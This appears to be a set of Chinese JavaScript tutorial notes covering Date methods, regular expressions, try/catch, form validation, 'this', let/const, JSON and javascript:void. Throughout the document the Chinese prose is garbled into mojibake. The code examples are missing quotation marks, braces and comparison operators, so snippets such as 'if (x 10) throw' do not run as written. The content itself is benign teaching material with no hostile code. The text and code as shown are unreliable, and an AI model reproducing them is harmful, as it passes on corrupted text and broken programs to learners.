æ—¥æœŸè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼ˆè¿˜æœ‰æ•°å­—ï¼Œå¸ƒå°”å€¼è½¬åŒ–æˆå­—ç¬¦ä¸²çš„æ–¹æ³•ç½‘ä¸Šéƒ½å¯ä»¥æ‰¾åˆ°ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼‰ getDate() ä» Date å¯¹è±¡è¿”å›ä¸€ä¸ªæœˆä¸­çš„æŸä¸€å¤© (1 ~ 31)ã€‚ getDay() ä» Date å¯¹è±¡è¿”å›ä¸€å‘¨ä¸­çš„æŸä¸€å¤© (0 ~ 6)ã€‚ getFullYear() ä» Date å¯¹è±¡ä»¥å››ä½æ•°å­—è¿”å›å¹´ä»½ã€‚ getHours() è¿”å› Date å¯¹è±¡çš„å°æ—¶ (0 ~ 23)ã€‚ getMilliseconds() è¿”å› Date å¯¹è±¡çš„æ¯«ç§’(0 ~ 999)ã€‚ getMinutes() è¿”å› Date å¯¹è±¡çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ getMonth() ä» Date å¯¹è±¡è¿”å›æœˆä»½ (0 ~ 11)ã€‚ getSeconds() è¿”å› Date å¯¹è±¡çš„ç§’æ•° (0 ~ 59)ã€‚ getTime() è¿”å› 1970 å¹´ 1 æœˆ 1 æ—¥è‡³ä»Šçš„æ¯«ç§’æ•°ã€‚ å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—çš„æ–¹æ³•ï¼š Number() æ–¹æ³• æè¿° parseFloat() è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ parseInt() è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚ æ­£åˆ™è¡¨è¾¾å¼æ­£åˆ™è¡¨è¾¾å¼æ˜¯ç”±ä¸€ä¸ªå­—ç¬¦åºåˆ—å½¢æˆçš„æœç´¢æ¨¡å¼ï¼Œå½“ä½ åœ¨æ–‡æœ¬ä¸­æœç´¢æ•°æ®æ—¶ï¼Œä½ å¯ä»¥ç”¨æœç´¢æ¨¡å¼æ¥æè¿°ä½ è¦æŸ¥è¯¢çš„å†…å®¹ã€‚ æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å­—ç¬¦ï¼Œæˆ–ä¸€ä¸ªæ›´å¤æ‚çš„æ¨¡å¼ï¼Œå¯ç”¨äºæ‰€æœ‰æ–‡æœ¬æœç´¢å’Œæ–‡æœ¬æ›¿æ¢çš„æ“ä½œã€‚ è¯­æ³•ï¼š/æ­£åˆ™è¡¨è¾¾å¼ä¸»ä½“/ä¿®é¥°ç¬¦(å¯é€‰) æ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ç”¨äºä¸¤ä¸ªå­—ç¬¦ä¸²æ–¹æ³• : search() å’Œ replace()ã€‚ search() æ–¹æ³•ç”¨äºæ£€ç´¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­å­—ç¬¦ä¸²ï¼Œæˆ–æ£€ç´¢ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›å­ä¸²çš„èµ·å§‹ä½ç½®ã€‚ function myFunction() var str=Visit runoob; var n=str.search(/Runoob/i); document.getElementById(demo).innerHTML=n; replace() æ–¹æ³•ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­ç”¨ä¸€äº›å­—ç¬¦ä¸²æ›¿æ¢å¦ä¸€äº›å­—ç¬¦ä¸²ï¼Œæˆ–æ›¿æ¢ä¸€ä¸ªä¸æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å­ä¸²ã€‚ function myFunction() var str=document.getElementById(demo).innerHTML; var txt=str.replace(/die/i,happy); document.getElementById(demo).innerHTML=txt; ä¿®é¥°ç¬¦ i æ‰§è¡Œå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„åŒ¹é…ã€‚ g æ‰§è¡Œå…¨å±€åŒ¹é…ï¼ˆæŸ¥æ‰¾æ‰€æœ‰åŒ¹é…è€Œéåœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ååœæ­¢ï¼‰ã€‚ m æ‰§è¡Œå¤šè¡ŒåŒ¹é…ã€‚ æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ æ–¹æ‹¬å·ç”¨äºæŸ¥æ‰¾æŸä¸ªèŒƒå›´å†…çš„å­—ç¬¦ï¼š è¡¨è¾¾å¼ æè¿° [abc] æŸ¥æ‰¾æ–¹æ‹¬å·ä¹‹é—´çš„ä»»ä½•å­—ç¬¦ã€‚ [0-9] æŸ¥æ‰¾ä»»ä½•ä» 0 è‡³ 9 çš„æ•°å­—ã€‚ (x|y) æŸ¥æ‰¾ä»»ä½•ä»¥ | åˆ†éš”çš„é€‰é¡¹ã€‚ å…ƒå­—ç¬¦æ˜¯æ‹¥æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼š å…ƒå­—ç¬¦ æè¿° \\d æŸ¥æ‰¾æ•°å­—ã€‚ \\s æŸ¥æ‰¾ç©ºç™½å­—ç¬¦ã€‚ \\b åŒ¹é…å•è¯è¾¹ç•Œã€‚ \\uxxxx æŸ¥æ‰¾ä»¥åå…­è¿›åˆ¶æ•° xxxx è§„å®šçš„ Unicode å­—ç¬¦ã€‚ é‡è¯: é‡è¯ æè¿° n+ åŒ¹é…ä»»ä½•åŒ…å«è‡³å°‘ä¸€ä¸ª n çš„å­—ç¬¦ä¸²ã€‚ n* åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ª n çš„å­—ç¬¦ä¸²ã€‚ n? åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–ä¸€ä¸ª n çš„å­—ç¬¦ä¸²ã€‚ RegExpå¯¹è±¡RegExp å¯¹è±¡æ˜¯ä¸€ä¸ªé¢„å®šä¹‰äº†å±æ€§å’Œæ–¹æ³•çš„æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡ åˆ›å»º RegExp å¯¹è±¡çš„æ–¹å¼ å­—é¢é‡è¡¨ç¤ºæ³•ï¼šä½¿ç”¨æ–œæ ï¼ˆ/ï¼‰å°†æ­£åˆ™è¡¨è¾¾å¼æ‹¬èµ·æ¥ã€‚ javascriptCopy codevar regex = /pattern/; æ„é€ å‡½æ•°è¡¨ç¤ºæ³•ï¼šä½¿ç”¨ RegExp æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ª RegExp å¯¹è±¡ã€‚ javascriptCopy codevar regex = new RegExp(pattern); RegExpå¯¹è±¡çš„å¸¸ç”¨æ–¹æ³•å’Œå±æ€§ **test()**ï¼šç”¨äºæ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ var pattl=new RegExp(e);document.write(pattl.test(The best thing)); **exec()**ï¼šç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡Œä¸€ä¸ªæœç´¢åŒ¹é…ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™è¿”å›ä¸€ä¸ªç»“æœæ•°ç»„ï¼›å¦åˆ™è¿”å› nullã€‚ var regex = /\\d+/g; // å®šä¹‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºåŒ¹é…æ•°å­—var str = Today is 2024-01-11, and its raining. The temperature is 15Â°C.;var match;while ((match = regex.exec(str)) !== null) console.log(Found: + match[0] + , at index: + match.index); sourceï¼šRegExp å¯¹è±¡çš„åªè¯»å±æ€§ï¼Œè¿”å›æ­£åˆ™è¡¨è¾¾å¼çš„æ–‡æœ¬å­—ç¬¦ä¸²ã€‚ javascriptCopy codeconsole.log(regex.source); flagsï¼šRegExp å¯¹è±¡çš„åªè¯»å±æ€§ï¼Œè¿”å›æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦å­—ç¬¦ä¸²ã€‚ console.log(regex.flags); throw,try,catchtry è¯­å¥æµ‹è¯•ä»£ç å—çš„é”™è¯¯ã€‚ catch è¯­å¥å¤„ç†é”™è¯¯ã€‚ throw è¯­å¥åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯ã€‚ finally è¯­å¥åœ¨ try å’Œ catch è¯­å¥ä¹‹åï¼Œæ— è®ºæ˜¯å¦æœ‰è§¦å‘å¼‚å¸¸ï¼Œè¯¥è¯­å¥éƒ½ä¼šæ‰§è¡Œã€‚ æŠ›å‡º(throw)é”™è¯¯ å½“é”™è¯¯å‘ç”Ÿæ—¶ï¼Œå½“äº‹æƒ…å‡ºé—®é¢˜æ—¶ï¼ŒJavaScript å¼•æ“é€šå¸¸ä¼šåœæ­¢ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ã€‚ æè¿°è¿™ç§æƒ…å†µçš„æŠ€æœ¯æœ¯è¯­æ˜¯ï¼šJavaScript å°†æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ tryå’Œcatch try è¯­å¥å…è®¸æˆ‘ä»¬å®šä¹‰åœ¨æ‰§è¡Œæ—¶è¿›è¡Œé”™è¯¯æµ‹è¯•çš„ä»£ç å—ã€‚ catch è¯­å¥å…è®¸æˆ‘ä»¬å®šä¹‰å½“ try ä»£ç å—å‘ç”Ÿé”™è¯¯æ—¶ï¼Œæ‰€æ‰§è¡Œçš„ä»£ç å—ã€‚ JavaScript è¯­å¥ try å’Œ catch æ˜¯æˆå¯¹å‡ºç°çš„ã€‚ try ... //å¼‚å¸¸çš„æŠ›å‡º catch(e) ... //å¼‚å¸¸çš„æ•è·ä¸å¤„ç† finally ... //ç»“æŸå¤„ç† å®ä¾‹å¦‚ä¸‹ï¼š script var txt=; function message() try adddlert(Welcome guest!); catch(err) txt=æœ¬é¡µæœ‰ä¸€ä¸ªé”™è¯¯ã€‚ ; txt+=é”™è¯¯æè¿°ï¼š + err.message + ; txt+=ç‚¹å‡»ç¡®å®šç»§ç»­ã€‚ ; alert(txt); /scriptinput type=button value=ç‚¹å‡»æŸ¥çœ‹æ¶ˆæ¯ onclick=message()/ å¯¹äºerr.messageçš„ç†è§£ï¼šcatch å—æ•è·äº†å¯èƒ½å‘ç”Ÿçš„é”™è¯¯ï¼Œå¹¶å°†é”™è¯¯å¯¹è±¡å­˜å‚¨åœ¨å˜é‡ err ä¸­ã€‚ç„¶åï¼Œé€šè¿‡ err.message å±æ€§å¯ä»¥è·å–åˆ°è¯¥é”™è¯¯å¯¹è±¡çš„æ¶ˆæ¯å†…å®¹ï¼Œå³é”™è¯¯çš„æè¿°ä¿¡æ¯ã€‚ ä¸finallyè¯­å¥ä¹‹é—´çš„è”ç”¨ pä¸ç®¡è¾“å…¥æ˜¯å¦æ­£ç¡®ï¼Œè¾“å…¥æ¡†éƒ½ä¼šå†è¾“å…¥åæ¸…ç©ºã€‚/ppè¯·è¾“å…¥ 5 ~ 10 ä¹‹é—´çš„æ•°å­—ï¼š/pinput id=demo type=textbutton type=button onclick=myFunction()ç‚¹æˆ‘/buttonp id=p01/pscriptfunction myFunction() var message, x; message = document.getElementById(p01); message.innerHTML = ; x = document.getElementById(demo).value; try if(x == ) throw å€¼æ˜¯ç©ºçš„; if(isNaN(x)) throw å€¼ä¸æ˜¯ä¸€ä¸ªæ•°å­—; x = Number(x); if(x 10) throw å¤ªå¤§; if(x 5) throw å¤ªå°; catch(err) message.innerHTML = é”™è¯¯: + err + .; finally document.getElementById(demo).value = ; /script isNaN() æ˜¯ JavaScript ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦ä¸º â€œNaNâ€ï¼ˆNot-a-Numberï¼Œéæ•°å­—ï¼‰ã€‚ è¡¨å•éªŒè¯HTMLçº¦æŸéªŒè¯ HTML çº¦æŸéªŒè¯åŸºäºï¼šHTML è¾“å…¥å±æ€§ï¼ŒCSS ä¼ªç±»é€‰æ‹©å™¨ï¼ŒDOM å±æ€§å’Œæ–¹æ³• HTML è¾“å…¥å±æ€§ï¼š å±æ€§ æè¿° disabled è§„å®šè¾“å…¥çš„å…ƒç´ ä¸å¯ç”¨ max è§„å®šè¾“å…¥å…ƒç´ çš„æœ€å¤§å€¼ min è§„å®šè¾“å…¥å…ƒç´ çš„æœ€å°å€¼ pattern è§„å®šè¾“å…¥å…ƒç´ å€¼çš„æ¨¡å¼ required è§„å®šè¾“å…¥å…ƒç´ å­—æ®µæ˜¯å¿…éœ€çš„ type è§„å®šè¾“å…¥å…ƒç´ çš„ç±»å‹ å¿…å¡«æˆ–å¿…é€‰é¡¹ç›® !DOCTYPE htmlhtmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headheadscriptfunction validateForm()var x=document.forms[myForm][fname].value;if (x==null || x==) alert(å§“å¿…é¡»å¡«å†™); return false; /script/headbodyform name=myForm action=demo-form.php onsubmit=return validateForm() method=postå§“: input type=text name=fnameinput type=submit value=æäº¤/form/body/html åˆ†æï¼švar x=document.forms[myForm][fname].value;ï¼šåœ¨å‡½æ•°å†…éƒ¨ï¼Œé€šè¿‡ document.forms[myForm][fname] è·å–äº†è¡¨å•ä¸­åä¸º â€œfnameâ€ çš„è¾“å…¥æ¡†ï¼Œå¹¶ä½¿ç”¨ .value è·å–äº†è¯¥è¾“å…¥æ¡†çš„å€¼ï¼Œå°†å…¶èµ‹ç»™å˜é‡ xã€‚ return false;ï¼šè¿”å› falseï¼Œè¡¨ç¤ºè¡¨å•éªŒè¯å¤±è´¥ï¼Œé˜»æ­¢è¡¨å•çš„æäº¤ï¼ˆå¦‚æœåˆ é™¤è¿™è¡Œä»£ç ï¼Œåˆ™å¯ä»¥æŠ¥é”™ï¼Œä½†è¡¨å•ä¼šç»§ç»­æäº¤ï¼‰ E-mailéªŒè¯ scriptfunction validateForm()\tvar x=document.forms[myForm][email].value;\tvar atpos=x.indexOf(@);\tvar dotpos=x.lastIndexOf(.);\tif (atpos1 || dotposatpos+2 || dotpos+2=x.length) alert(ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ e-mail åœ°å€); return false;\t/scriptform name=myForm action=demo-form.php onsubmit=return validateForm(); method=postEmail: input type=text name=emailinput type=submit value=æäº¤/form éªŒè¯APIçº¦æŸéªŒè¯DOMæ–¹æ³• å±æ€§ æè¿° checkValidity() å¦‚æœ input å…ƒç´ ä¸­çš„æ•°æ®æ˜¯åˆæ³•çš„è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ setCustomValidity() è®¾ç½® input å…ƒç´ çš„ validationMessage å±æ€§ï¼Œç”¨äºè‡ªå®šä¹‰é”™è¯¯æç¤ºä¿¡æ¯çš„æ–¹æ³•ã€‚ä½¿ç”¨ setCustomValidity è®¾ç½®äº†è‡ªå®šä¹‰æç¤ºåï¼Œvalidity.customError å°±ä¼šå˜æˆ trueï¼ŒcheckValidity æ€»æ˜¯ä¼šè¿”å› falseã€‚å¦‚æœè¦é‡æ–°åˆ¤æ–­éœ€è¦å–æ¶ˆè‡ªå®šä¹‰æç¤ºï¼Œæ–¹å¼å¦‚ä¸‹ï¼šsetCustomValidity() setCustomValidity(null) setCustomValidity(undefined) bodypè¾“å…¥æ•°å­—å¹¶ç‚¹å‡»éªŒè¯æŒ‰é’®:/pinput id=id1 type=number min=100 max=300 requiredbutton onclick=myFunction()éªŒè¯/buttonpå¦‚æœè¾“å…¥çš„æ•°å­—å°äº 100 æˆ–å¤§äº300ï¼Œä¼šæç¤ºé”™è¯¯ä¿¡æ¯ã€‚/pp id=demo/pscriptfunction myFunction() var inpObj = document.getElementById(id1); if (inpObj.checkValidity() == false) document.getElementById(demo).innerHTML = inpObj.validationMessage; else document.getElementById(demo).innerHTML = è¾“å…¥æ­£ç¡®; /script/body validationMessage å±æ€§ä¼šè¿”å›ä¸€ä¸ªåŒ…å«äº†å…³äºè¾“å…¥æ¡†éªŒè¯å¤±è´¥çš„é”™è¯¯æ¶ˆæ¯çš„å­—ç¬¦ä¸² çº¦æŸéªŒè¯DOMå±æ€§ å±æ€§ æè¿° validity å¸ƒå°”å±æ€§å€¼ï¼Œè¿”å› input è¾“å…¥å€¼æ˜¯å¦åˆæ³• validationMessage æµè§ˆå™¨é”™è¯¯æç¤ºä¿¡æ¯ willValidate æŒ‡å®š input æ˜¯å¦éœ€è¦éªŒè¯ Validityå±æ€§ å±æ€§ æè¿° customError è®¾ç½®ä¸º true, å¦‚æœè®¾ç½®äº†è‡ªå®šä¹‰çš„ validity ä¿¡æ¯ã€‚ patternMismatch è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼ä¸åŒ¹é…å®ƒçš„æ¨¡å¼å±æ€§ã€‚ rangeOverflow è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ã€‚ rangeUnderflow è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼å°äºå®ƒçš„æœ€å°å€¼ã€‚ stepMismatch è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼ä¸æ˜¯æŒ‰ç…§è§„å®šçš„ step å±æ€§è®¾ç½®ã€‚ tooLong è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼è¶…è¿‡äº† maxLength å±æ€§è®¾ç½®çš„é•¿åº¦ã€‚ typeMismatch è®¾ç½®ä¸º true, å¦‚æœå…ƒç´ çš„å€¼ä¸æ˜¯é¢„æœŸç›¸åŒ¹é…çš„ç±»å‹ã€‚ valueMissing è®¾ç½®ä¸º trueï¼Œå¦‚æœå…ƒç´  (required å±æ€§) æ²¡æœ‰å€¼ã€‚ valid è®¾ç½®ä¸º trueï¼Œå¦‚æœå…ƒç´ çš„å€¼æ˜¯åˆæ³•çš„ã€‚ æ¥ä¸ªå®ä¾‹ï¼š function myFunction() var txt = ; if (document.getElementById(id1).validity.rangeOverflow) txt = è¾“å…¥çš„å€¼å¤ªå¤§äº†; document.getElementById(demo).innerHTML = txt; thiså…³é”®å­— this ä¸æ˜¯å›ºå®šä¸å˜çš„ï¼Œå®ƒä¼šéšç€æ‰§è¡Œç¯å¢ƒçš„æ”¹å˜è€Œæ”¹å˜ã€‚ åœ¨æ–¹æ³•ä¸­ï¼Œthis è¡¨ç¤ºè¯¥æ–¹æ³•æ‰€å±çš„å¯¹è±¡ã€‚ï¼ˆåœ¨ JavaScript ä¸­ï¼Œå¯¹è±¡çš„å±æ€§å¯ä»¥æ˜¯å‡½æ•°ï¼Œè¿™ç§å±æ€§ç§°ä¸ºæ–¹æ³•ï¼‰ å¦‚æœå•ç‹¬ä½¿ç”¨ï¼Œthis è¡¨ç¤ºå…¨å±€å¯¹è±¡ã€‚ åœ¨å‡½æ•°ä¸­ï¼Œthis è¡¨ç¤ºå…¨å±€å¯¹è±¡ã€‚ åœ¨å‡½æ•°ä¸­ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œthis æ˜¯æœªå®šä¹‰çš„(undefined)ã€‚ åœ¨äº‹ä»¶ä¸­ï¼Œthis è¡¨ç¤ºæ¥æ”¶äº‹ä»¶çš„å…ƒç´ ã€‚ ç±»ä¼¼ call() å’Œ apply() æ–¹æ³•å¯ä»¥å°† this å¼•ç”¨åˆ°ä»»ä½•å¯¹è±¡ã€‚ æ–¹æ³•ä¸­çš„this var person= firstname:Sherlock, Lastname:Holmes, id:5566, fullname:function() return this.firstname+ +this.Lastname; ; document.getElementById(demo).innerHTML=person.fullname(); fullName æ–¹æ³•æ‰€å±çš„å¯¹è±¡å°±æ˜¯ person æƒ³è¦ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œéœ€è¦åœ¨æ–¹æ³•ååé¢åŠ ä¸Šä¸€å¯¹æ‹¬å· ()ï¼Œè¿™æ · JavaScript å°±çŸ¥é“ä½ æ˜¯åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å¦‚æœä¸åŠ æ‹¬å·ï¼Œé‚£ä¹ˆ person.fullname å°†è¢«è§†ä¸ºä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œè€Œä¸æ˜¯è°ƒç”¨è¯¥å‡½æ•°,é‚£ä¹ˆé¡µé¢ä¸­ç›¸åº”å…ƒç´ çš„å†…å®¹å°†ä¼šæ˜¯ function()ï¼Œè¡¨ç¤ºè¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªå‡½æ•° å•ç‹¬ä½¿ç”¨this var x = this;document.getElementById(demo).innerHTML = x;//è¿”å›çš„ç»“æœæ˜¯ï¼š[object Window] åœ¨æµè§ˆå™¨ä¸­ï¼Œwindow å°±æ˜¯è¯¥å…¨å±€å¯¹è±¡ å‡½æ•°ä¸­çš„this //use strict;document.getElementById(demo).innerHTML = myFunction();function myFunction() return this; å‡½æ•°çš„æ‰€å±è€…é»˜è®¤ç»‘å®šåˆ° this ä¸Šï¼Œåœ¨æµè§ˆå™¨ä¸­ï¼Œwindow å°±æ˜¯è¯¥å…¨å±€å¯¹è±¡ä¸º [object Window] ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå³åœ¨æœ‰ç¬¬ä¸€è¡Œä»£ç çš„æƒ…å†µä¸‹å‡½æ•°æ˜¯æ²¡æœ‰ç»‘å®šåˆ° this ä¸Šï¼Œè¿™æ—¶å€™ this æ˜¯ undefinedï¼Œè¿™æ˜¯å› ä¸ºä¸¥æ ¼æ¨¡å¼ä¸‹ä¸å…è®¸é»˜è®¤ç»‘å®š äº‹ä»¶ä¸­çš„this bodybutton onclick=this.style.display=noneç‚¹æˆ‘åæˆ‘å°±æ¶ˆå¤±äº†/button/body this å…³é”®å­—ä»£è¡¨å½“å‰è§¦å‘äº†äº‹ä»¶çš„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯æŒ‰é’®æœ¬èº«ã€‚this.style.display=none è¡¨ç¤ºè®¾ç½®æŒ‰é’®çš„ display å±æ€§ä¸º noneï¼Œè¿™æ ·æŒ‰é’®å°±ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šäº† æ˜¾å¼å‡½æ•°ç»‘å®š åœ¨ JavaScript ä¸­å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå¯¹è±¡åˆ™æœ‰æ–¹æ³•ï¼Œapply å’Œ call å°±æ˜¯å‡½æ•°å¯¹è±¡çš„æ–¹æ³•ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•å¼‚å¸¸å¼ºå¤§ï¼Œä»–ä»¬å…è®¸åˆ‡æ¢å‡½æ•°æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆcontextï¼‰ï¼Œå³ this ç»‘å®šçš„å¯¹è±¡ var person1 = fullName: function() return this.firstName + + this.lastName; var person2 = firstName:John, lastName: Doe,var x = person1.fullName.call(person2); document.getElementById(demo).innerHTML = x; ä½¿ç”¨ person2 ä½œä¸ºå‚æ•°æ¥è°ƒç”¨ person1.fullName æ–¹æ³•æ—¶, this å°†æŒ‡å‘ person2, å³ä¾¿å®ƒæ˜¯ person1 çš„æ–¹æ³• letå’Œconstlet å£°æ˜çš„å˜é‡åªåœ¨ let å‘½ä»¤æ‰€åœ¨çš„ä»£ç å—å†…æœ‰æ•ˆã€‚ const å£°æ˜ä¸€ä¸ªåªè¯»çš„å¸¸é‡ï¼Œå£°æ˜æ—¶å¿…é¡»è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸€æ—¦å£°æ˜ï¼Œå¸¸é‡çš„å€¼å°±ä¸èƒ½æ”¹å˜ã€‚ let å£°æ˜çš„å˜é‡åªåœ¨ let å‘½ä»¤æ‰€åœ¨çš„ä»£ç å— {} å†…æœ‰æ•ˆï¼Œåœ¨ {} ä¹‹å¤–ä¸èƒ½è®¿é—® let x = 2;// è¿™é‡Œä¸èƒ½ä½¿ç”¨ x å˜é‡ åœ¨ç›¸åŒçš„ä½œç”¨åŸŸæˆ–å—çº§ä½œç”¨åŸŸä¸­ï¼Œä¸èƒ½ä½¿ç”¨ let å…³é”®å­—æ¥é‡ç½® var å…³é”®å­—å£°æ˜çš„å˜é‡,ï¼ŒåŒæ ·ä¸èƒ½ä½¿ç”¨ var å…³é”®å­—æ¥é‡ç½® let å…³é”®å­—å£°æ˜çš„å˜é‡ã€‚ï¼ˆå°±æ˜¯å“ªä¸ªå…³é”®å­—å…ˆå£°æ˜å˜é‡å°±æ˜¯åˆæ³•çš„ï¼‰ var x = 2; // åˆæ³•let x = 3; // ä¸åˆæ³• var x = 4; // åˆæ³• let x = 5 // ä¸åˆæ³• const çš„æœ¬è´¨: const å®šä¹‰çš„å˜é‡å¹¶éå¸¸é‡ï¼Œå¹¶éä¸å¯å˜ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªå¸¸é‡å¼•ç”¨ä¸€ä¸ªå€¼ã€‚ä½¿ç”¨ const å®šä¹‰çš„å¯¹è±¡æˆ–è€…æ•°ç»„ï¼Œå…¶å®æ˜¯å¯å˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å…¶å¯¹è±¡æˆ–è€…æ•°ç»„é‡Œé¢çš„å…ƒç´ ï¼Œä½†æ˜¯ä¸èƒ½å¯¹è¯¥å¯¹è±¡æˆ–è€…æ•°ç»„è¿›è¡Œé‡æ–°èµ‹å€¼ï¼Œå› ä¸ºè¿™æ ·çš„è¯å†…å­˜åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™æ˜¯ä¸å…è®¸çš„ const car = type:Fiat, model:500, color:white;car = type:Volvo, model:EX60, color:red; // é”™è¯¯car.color = red;car.owner = Johnsonï¼›document.getElementById(demo).innerHTML = Car owner is + car.owner; åœ¨ç›¸åŒçš„ä½œç”¨åŸŸæˆ–å—çº§ä½œç”¨åŸŸä¸­ï¼Œä¸èƒ½ä½¿ç”¨ const å…³é”®å­—æ¥é‡ç½® const å…³é”®å­—å£°æ˜çš„å˜é‡ const å…³é”®å­—åœ¨ä¸åŒä½œç”¨åŸŸï¼Œæˆ–ä¸åŒå—çº§ä½œç”¨åŸŸä¸­æ˜¯å¯ä»¥é‡æ–°å£°æ˜èµ‹å€¼çš„ JSONä»¥ä¸‹ JSON è¯­æ³•å®šä¹‰äº† sites å¯¹è±¡: 3 æ¡ç½‘ç«™ä¿¡æ¯ï¼ˆå¯¹è±¡ï¼‰çš„æ•°ç»„: sites:[ name:Runoob, url:www.runoob.com, name:Google, url:www.google.com, name:Taobao, url:www.taobao.com] JSONæ ¼å¼åŒ–åä¸ºJavaScriptå¯¹è±¡ è¯­æ³•è§„åˆ™ï¼š æ•°æ®ä¸º é”®å€¼ å¯¹ã€‚ æ•°æ®ç”±é€—å·åˆ†éš”ã€‚ å¤§æ‹¬å·ä¿å­˜å¯¹è±¡ æ–¹æ‹¬å·ä¿å­˜æ•°ç»„ JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ var text = sites : [ + name:Runoob , url:www.runoob.com , + name:Google , url:www.google.com , + name:Taobao , url:www.taobao.com ];\tobj = JSON.parse(text);document.getElementById(demo).innerHTML = obj.sites[1].name + + obj.sites[1] é¦–å…ˆï¼Œåˆ›å»º JavaScript å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸º JSON æ ¼å¼çš„æ•°æ®ï¼›ç„¶åï¼Œä½¿ç”¨ JavaScript å†…ç½®å‡½æ•° JSON.parse() å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ï¼›æœ€åï¼Œåœ¨ä½ çš„é¡µé¢ä¸­ä½¿ç”¨æ–°çš„ JavaScript å¯¹è±¡ å‡½æ•° æè¿° JSON.parse() ç”¨äºå°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ã€‚ JSON.stringify() ç”¨äºå°† JavaScript å€¼è½¬æ¢ä¸º JSON å­—ç¬¦ä¸² voidvoidä¸»è¦çš„å°±æ˜¯é˜²æ­¢é¡µé¢è·³è½¬ javascript:void(0) è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š void(func())javascript:void(func()) å®ä¾‹å¦‚ä¸‹ï¼š body a href=javascript:void(0)å•å‡»æ­¤å¤„ä»€ä¹ˆä¹Ÿä¸ä¼šå‘ç”Ÿ/a/body å½“ç”¨æˆ·é“¾æ¥æ—¶ï¼Œvoid(0) è®¡ç®—ä¸º 0ï¼Œä½† Javascript ä¸Šæ²¡æœ‰ä»»ä½•æ•ˆæœã€‚ bodypç‚¹å‡»ä»¥ä¸‹é“¾æ¥æŸ¥çœ‹ç»“æœï¼š/pa href=javascript:void(alert(Warning!!!))ç‚¹æˆ‘!/a/body void()ä»…ä»…æ˜¯ä»£è¡¨ä¸è¿”å›ä»»ä½•å€¼ï¼Œä½†æ˜¯æ‹¬å·å†…çš„è¡¨è¾¾å¼è¿˜æ˜¯è¦è¿è¡Œ hrefâ€#â€ # åŒ…å«äº†ä¸€ä¸ªä½ç½®ä¿¡æ¯ï¼Œé»˜è®¤çš„é”šæ˜¯**#top** 